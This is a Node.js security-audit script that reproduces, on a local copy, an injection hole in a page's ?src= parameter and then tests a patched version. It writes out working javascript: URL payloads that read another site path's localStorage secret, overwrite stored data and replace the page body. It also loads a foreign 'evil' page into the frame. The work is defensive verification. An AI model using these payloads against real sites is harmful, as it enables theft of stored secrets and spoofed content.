/* Final audit after Stage 8, verifier v-repro-rob: an independent reproduction of robustness finding #0 (R-1),
   tools/step6/perf-run.html's ?src= parameter. Measurement only; nothing in the repository is changed. Never the live site.
   node tools/audit-post8/verification/v-repro-rob/repro-src.js  ->  docs/audit-post8-evidence/verification/v-repro-rob/repro-src.json
   A Pages-like layout is copied into the scratchpad: <site>/Austerlitz/tools/step6/{perf-run.html,perf-route.js} (byte copies, md5 checked),
   <site>/Austerlitz/austerlitz-command-map.html (the audited build, md5 checked), <site>/Other/index.html (a stand-in for another project site of
   the same account, which keeps a secret in localStorage), served from 127.0.0.1:A; a second server 127.0.0.1:B (another origin) serves evil.html.
   A patched copy perf-run-fixed.html (the finding's remedy: new URL(src,location.href) of location's origin and http(s), else the default) beside it.
   Cases, each a fresh page in one browser context (storage shared, as one visitor's browser):
   1 js-storage   ?src=javascript:... writes parent.localStorage and parent.document.title          (script in the page's origin?)
   2 js-crosspath ?src=javascript:... reads /Other/'s localStorage secret into parent.document.title  (another path on the same origin?)
   3 js-dom       ?src=javascript:... replaces parent.document.body                                   (arbitrary content under the address?)
   4 foreign      ?src=http://127.0.0.1:B/evil.html                                                    (a foreign page filling the window?)
   5 fixed-js     perf-run-fixed.html ?src=javascript:...                                              (the remedy rejects it?)
   (--only=5,6 runs those cases alone; the pages are read from domcontentloaded: the remedy's default loads the 2.8 MB build, whose load event takes over 60 s here)
   6 fixed-legit  perf-run-fixed.html ?src=../../austerlitz-command-map.html, waited until its "Start" is enabled (the remedy keeps the route) */
"use strict";
const fs=require("fs"), path=require("path"), http=require("http"), cp=require("child_process");
const A=require("../../lib.js"), TR=require("../../../visual/three-route.js");
const ONLY=(process.argv.find(a=>a.startsWith("--only="))||"").slice(7);
const ROOT=path.resolve(__dirname,"..","..","..",".."), OUT=path.join(ROOT,"docs","audit-post8-evidence","verification","v-repro-rob",ONLY?"repro-src-"+ONLY+".json":"repro-src.json");
const SITE=path.join(A.SCRATCH,"v-repro-rob","site");
const md5=f=>cp.execSync("md5sum "+JSON.stringify(f)).toString().split(" ")[0];
function serve(root){ return http.createServer((q,r)=>{ const u=decodeURIComponent(q.url.split("?")[0]); const f=path.join(root,u);
  if(!f.startsWith(root)||!fs.existsSync(f)||fs.statSync(f).isDirectory()){ r.writeHead(404); r.end("not found"); return; }
  r.writeHead(200,{"content-type":f.endsWith(".html")?"text/html; charset=utf-8":"application/javascript"}); r.end(fs.readFileSync(f)); }); }
(async()=>{
  const res={what:"v-repro-rob: perf-run.html ?src= reproduced on a local copy",started:new Date().toISOString(),files:{},cases:[]};
  const step6=path.join(SITE,"Austerlitz","tools","step6"); fs.mkdirSync(step6,{recursive:true}); fs.mkdirSync(path.join(SITE,"Other"),{recursive:true});
  const EVIL=path.join(A.SCRATCH,"v-repro-rob","evil"); fs.mkdirSync(EVIL,{recursive:true});
  for(const f of ["perf-run.html","perf-route.js"]) fs.copyFileSync(path.join(ROOT,"tools","step6",f),path.join(step6,f));
  fs.copyFileSync(path.join(ROOT,"austerlitz-command-map.html"),path.join(SITE,"Austerlitz","austerlitz-command-map.html"));
  const orig=fs.readFileSync(path.join(step6,"perf-run.html"),"utf8");
  const NEEDLE='src=q.get("src")||"../../austerlitz-command-map.html"';
  if(orig.split(NEEDLE).length!==2) throw new Error("needle not found once");
  const fixed=orig.replace(NEEDLE,'src=(function(s,d){ if(!s) return d; try{ var u=new URL(s,location.href); if(u.origin===location.origin&&/^https?:$/.test(u.protocol)) return u.href; }catch(e){} window.__srcRejected=s; return d; })(q.get("src"),"../../austerlitz-command-map.html")');
  fs.writeFileSync(path.join(step6,"perf-run-fixed.html"),fixed);
  fs.writeFileSync(path.join(SITE,"Other","index.html"),'<!doctype html><meta charset="utf-8"><title>Other project</title><script>localStorage.setItem("otherSecret","s3cr3t-'+Date.now()+'")</script>');
  fs.writeFileSync(path.join(EVIL,"evil.html"),'<!doctype html><meta charset="utf-8"><title>evil</title><body style="margin:0;background:#c00;color:#fff"><h1 id="evil" style="margin-top:60vh">FOREIGN CONTENT</h1>');
  res.files={
    "perf-run.html (repo)":md5(path.join(ROOT,"tools","step6","perf-run.html")),"perf-run.html (copy)":md5(path.join(step6,"perf-run.html")),
    "perf-route.js (repo)":md5(path.join(ROOT,"tools","step6","perf-route.js")),"perf-route.js (copy)":md5(path.join(step6,"perf-route.js")),
    "build (copy)":md5(path.join(SITE,"Austerlitz","austerlitz-command-map.html")),"perf-run-fixed.html":md5(path.join(step6,"perf-run-fixed.html"))};
  const sA=serve(SITE), sB=serve(EVIL);
  await new Promise(z=>sA.listen(0,"127.0.0.1",z)); await new Promise(z=>sB.listen(0,"127.0.0.1",z));
  const OA="http://127.0.0.1:"+sA.address().port, OB="http://127.0.0.1:"+sB.address().port, PR=OA+"/Austerlitz/tools/step6/";
  const b=await A.launch(); const ctx=await b.newContext({viewport:{width:1280,height:720}});
  const scrub=s=>String(s).split(OA).join("http://127.0.0.1:<A>").split(OB).join("http://127.0.0.1:<B>");
  async function run(id,file,src,o){ o=o||{}; if(ONLY&&!ONLY.split(",").some(k=>id.startsWith(k))) return null;
    const page=await ctx.newPage(); const log=[]; await TR.routeThree(page);
    page.on("console",m=>{ const t=m.type(); if(t==="error"||t==="warning") log.push(t+": "+scrub(m.text()).slice(0,200)); });
    page.on("pageerror",e=>log.push("pageerror: "+scrub(e.message).slice(0,200)));
    const url=PR+file+(src===null?"":"?src="+encodeURIComponent(src)); const t0=Date.now();
    await page.goto(url,{waitUntil:"domcontentloaded",timeout:60000});
    if(o.waitStart){ try{ await page.waitForFunction(()=>!document.getElementById("go").disabled,null,{timeout:o.waitStart,polling:1000}); }catch(e){ log.push("waitStart: "+e.message.slice(0,120)); } }
    else await page.waitForTimeout(4000);
    const r=await page.evaluate(()=>{ const fr=document.getElementById("app"), p=document.getElementById("panel"), g=document.getElementById("go"), m=document.getElementById("msg");
      let frameHref=null; try{ frameHref=fr&&fr.contentWindow.location.href; }catch(e){ frameHref="(cross-origin: "+e.name+")"; }
      return {origin:location.origin,title:document.title,ls:{vrr:localStorage.getItem("vrr"),otherSecret:localStorage.getItem("otherSecret")},
        frameSrcAttr:fr?fr.getAttribute("src"):"(no #app)",frameHref,frameRect:fr?(r=>[r.x,r.y,r.width,r.height])(fr.getBoundingClientRect()):null,
        panelRect:p?(r=>[r.x,r.y,r.width,r.height])(p.getBoundingClientRect()):null,msg:m?m.textContent:"(no #msg)",goDisabled:g?g.disabled:null,
        phish:!!document.getElementById("vrr-phish"),srcRejected:window.__srcRejected||null,
        bodyStart:document.body.innerHTML.slice(0,80)}; });
    const fr=page.frames().filter(f=>f!==page.mainFrame()).map(f=>({url:scrub(f.url()).slice(0,120)}));
    let foreignText=null; for(const f of page.frames()) if(f.url().startsWith(OB)) { try{ foreignText=await f.evaluate(()=>document.getElementById("evil").textContent); }catch(e){ foreignText="err "+e.message; } }
    if(o.shot) await page.screenshot({path:path.join(path.dirname(OUT),o.shot),type:"jpeg",quality:60});
    const row=JSON.parse(scrub(JSON.stringify(Object.assign({id,url:url.slice(0,400),src},r))));
    row.frames=fr; row.foreignText=foreignText; row.seconds=Math.round((Date.now()-t0)/1000); row.log=log; res.cases.push(row); await page.close(); return row; }
  try{
    // seed another path's storage on the same origin, as another project site of the account would
    { const p=await ctx.newPage(); await p.goto(OA+"/Other/index.html"); res.seeded=await p.evaluate(()=>localStorage.getItem("otherSecret")); await p.close(); }
    await run("1 js-storage","perf-run.html","javascript:parent.localStorage.setItem('vrr',parent.location.origin);parent.document.title='VRR1 '+parent.location.origin+' '+parent.location.pathname;void 0");
    await run("2 js-crosspath","perf-run.html","javascript:parent.document.title='VRR2 '+parent.localStorage.getItem('otherSecret');void 0");
    await run("3 js-dom","perf-run.html","javascript:parent.document.body.innerHTML='<h1 id=vrr-phish>replaced by the link</h1>';void 0",{shot:"js-dom.jpg"});
    await run("4 foreign","perf-run.html",OB+"/evil.html",{shot:"foreign.jpg"});
    await run("5 fixed-js","perf-run-fixed.html","javascript:parent.document.title='VRR5 '+parent.location.origin;void 0");
    await run("5b fixed-foreign","perf-run-fixed.html",OB+"/evil.html");
    await run("6 fixed-legit","perf-run-fixed.html","../../austerlitz-command-map.html",{waitStart:240000});
    res.browser=b.version();
  }catch(e){ res.error=String(e&&e.stack||e); process.exitCode=1; }
  finally{ await b.close(); sA.close(); sB.close(); res.finished=new Date().toISOString(); fs.writeFileSync(OUT,JSON.stringify(res,null,1)); console.log("done",OUT); }
})();
